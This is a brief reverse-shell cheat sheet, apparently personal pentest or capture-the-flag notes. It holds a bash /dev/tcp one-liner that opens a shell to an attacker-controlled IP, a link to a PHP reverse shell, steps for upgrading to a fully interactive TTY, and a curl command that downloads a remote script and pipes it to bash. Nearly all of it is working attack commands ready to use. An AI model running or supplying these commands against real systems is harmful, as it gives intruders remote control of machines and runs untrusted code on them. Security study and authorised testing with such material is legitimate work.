# Reverse Shells - Examples

https://www.revshells.com/

## Bash

	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"

## PHP

	https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php


## Fully interactive shell

In the reverse shell write

	python3 -c 'import pty;pty.spawn("/bin/bash")'

Put nc in the background by pressing CTRL+Z
then write

	stty raw -echo; fg;
	export TERM=xterm


## Tips

Ugrading the the reverse shell we got

	script /dev/null -c bash

Download reverse shell file and imediately execute it

	curl 'http://10.10.16.20:2020/test.sh'|bash